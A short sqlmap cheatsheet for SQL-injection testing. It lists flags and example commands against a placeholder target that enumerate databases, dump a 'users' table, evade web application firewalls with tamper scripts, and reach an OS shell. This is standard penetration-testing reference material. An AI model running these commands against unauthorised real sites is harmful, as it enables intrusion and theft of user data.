# sqlmap Cheatsheet

## Common options

- `-u` URL
- `-p` parameter to test
- `--data` POST data
- `--level` and `--risk` increase test intensity
- `--batch` non-interactive
- `--dbs` enumerate databases
- `-D <db>` target DB
- `--tables` list tables
- `-T <table>` target table
- `--dump` dump contents
- `--os-shell` or `--os-pwn` for OS access (use responsibly)

## Example commands

- Enumerate databases:

```bash
sqlmap -u "http://target/item.php?id=1" --dbs --batch
```

- Enumerate tables from a database:

```bash
sqlmap -u "http://target/item.php?id=1" -D shopdb --tables --batch
```

- Dump user table:

```bash
sqlmap -u "http://target/item.php?id=1" -D shopdb -T users --dump --batch
```

- Use tamper scripts when WAF blocks payloads (e.g., `space2comment`, `between`, `randomcase`):

```bash
sqlmap -u "http://target/item.php?id=1" --tamper=space2comment --batch
```

- Funnel traffic through Burp or a proxy:

```bash
sqlmap -u "http://target/item.php?id=1" --proxy=http://127.0.0.1:8080 --batch
```

## Tips

- Start with `--level=1 --risk=1` and increase only when necessary.
- Use `--threads` to speed up time-based extraction, but beware of instability.
- Read `--technique` docs to restrict to specific types: `B` (boolean), `T` (time), `E` (error), `U` (union), `S` (stacked).
